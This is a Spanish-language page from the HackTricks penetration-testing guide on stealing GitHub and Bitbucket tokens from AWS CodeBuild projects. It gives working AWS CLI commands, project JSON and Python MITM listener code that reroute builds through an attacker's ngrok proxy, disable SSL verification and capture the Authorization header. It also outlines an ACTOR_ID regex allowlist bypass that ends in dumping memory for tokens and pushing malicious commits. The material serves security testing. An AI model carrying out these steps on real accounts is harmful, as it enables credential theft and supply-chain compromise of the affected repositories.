# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Recuperar Tokens Configurados de Github/Bitbucket

Primero, comprueba si hay credenciales de origen configuradas que puedas leak:
```bash
aws codebuild list-source-credentials
```
### Vía Docker Image

Si detectas que la autenticación, por ejemplo a Github, está configurada en la cuenta, puedes **exfiltrate** ese **access** (**GH token or OAuth token**) haciendo que Codebuild **use una Docker image específica** para ejecutar el build del proyecto.

Para ello podrías **create a new Codebuild project** o cambiar el **environment** de uno existente para establecer la **Docker image**.

La Docker image que podrías usar es [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Se trata de una Docker image muy básica que establecerá las **env variables `https_proxy`**, **`http_proxy`** y **`SSL_CERT_FILE`**. Esto te permitirá interceptar la mayoría del tráfico del host indicado en **`https_proxy`** y **`http_proxy`** y confiar en el certificado SSL indicado en **`SSL_CERT_FILE`**.

1. **Crear y subir tu propio Docker MitM image**
- Sigue las instrucciones del repo para configurar la IP de tu proxy y tu certificado SSL, y **construir la Docker image**.
- **NO CONFIGURES `http_proxy`** para no interceptar las solicitudes al endpoint de metadata.
- Puedes usar **`ngrok`** como `ngrok tcp 4444` para establecer el proxy hacia tu host
- Una vez que tengas la Docker image construida, **súbela a un repo público** (Dockerhub, ECR...)
2. **Set the environment**
- Crea un **nuevo Codebuild project** o **modifica** el environment de uno existente.
- Configura el proyecto para que use la **Docker image previamente generada**

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Configura el MitM proxy en tu host**

- Como indica el **Github repo**, podrías usar algo como:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> La **versión de mitmproxy usada fue 9.0.1**, se informó que con la versión 10 esto podría no funcionar.

4. **Ejecuta la build & captura las credenciales**

- Puedes ver el token en la cabecera **Authorization**:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

Esto también se podría hacer desde el aws cli con algo como
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### A través de insecureSSL

Los proyectos de **Codebuild** tienen una configuración llamada **`insecureSsl`** que está oculta en la web y solo se puede cambiar desde la API.\
Habilitar esto permite a Codebuild conectarse al repositorio **sin verificar el certificado** ofrecido por la plataforma.

- Primero necesitas enumerar la configuración actual con algo como:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- Entonces, con la información recopilada puedes actualizar la configuración del proyecto **`insecureSsl`** a **`True`**. El siguiente es un ejemplo de mi actualización de un proyecto, fíjate en **`insecureSsl=True`** al final (esta es la única cosa que necesitas cambiar de la configuración recopilada).
- Además, añade también las variables de entorno **http_proxy** y **https_proxy** apuntando a tu ngrok tcp así:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- Luego, ejecuta el ejemplo básico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) en el puerto indicado por las variables proxy (http_proxy y https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Finalmente, haz clic en **Build the project**, las **credentials** serán **sent in clear text** (base64) al puerto mitm:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~Vía protocolo HTTP~~

> [!TIP] > **Esta vulnerabilidad fue corregida por AWS en algún momento la semana del 20 de feb de 2023 (creo que el viernes). Así que un atacante ya no puede abusar de ella :)**

Un atacante con **permisos elevados sobre un CodeBuild podría leak el token de Github/Bitbucket** configurado o, si los permisos se configuraron vía OAuth, el **token OAuth temporal usado para acceder al código**.

- Un atacante podría añadir las variables de entorno **http_proxy** y **https_proxy** al proyecto CodeBuild apuntando a su máquina (por ejemplo `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- Luego, cambiar la URL del repo de github para usar HTTP en lugar de HTTPS, por ejemplo: `http://github.com/carlospolop-forks/TestActions`
- Luego, ejecutar el ejemplo básico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) en el puerto indicado por las variables de proxy (http_proxy and https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- A continuación, haga clic en **Construir el proyecto** o inicie la compilación desde la línea de comandos:
```sh
aws codebuild start-build --project-name <proj-name>
```
- Finalmente, las **credenciales** serán **enviadas en texto claro** (base64) al puerto mitm:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> Ahora un atacante podrá usar el token desde su máquina, listar todos los privilegios que tiene y (ab)usar más fácilmente que usando el servicio CodeBuild directamente.

## Webhook filter ACTOR_ID regex allowlist bypass (PR-triggered privileged builds)

Los webhooks de GitHub de CodeBuild mal configurados que usan regexes `ACTOR_ID` sin anclar permiten que PRs *no confiables* inicien builds privilegiados. Si la allowlist es como `123456|7890123` sin `^`/`$`, cualquier ID que contenga una de esas subcadenas coincide. Debido a que los IDs de usuario de GitHub son secuenciales, un atacante puede competir para registrar un ID “eclipsing” (una supercadena de un ID confiable) y disparar el build.

**Exploit path**

1. Find public CodeBuild projects exposing webhook filters and extract an unanchored `ACTOR_ID` allowlist.
2. Obtain an eclipsing GitHub ID:
- Muestrea el contador global de IDs creando/eliminando orgs de GitHub (los org IDs comparten el pool).
- Prepara numerosas creaciones de manifestos de GitHub App y dispara las URLs de confirmación cuando el contador esté dentro de ~100 IDs del objetivo para registrar en ráfaga un bot ID que contenga la subcadena confiable.
3. Open a PR from the eclipsing account; the regex matches the substring and the privileged build runs.
4. Use build RCE (e.g., dependency install hooks) to dump process memory handling the GitHub credential and recover the PAT/OAuth token.
5. With the token’s `repo` scope, invite your account as collaborator/admin and push/approve malicious commits or exfiltrate secrets.

## Referencias
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
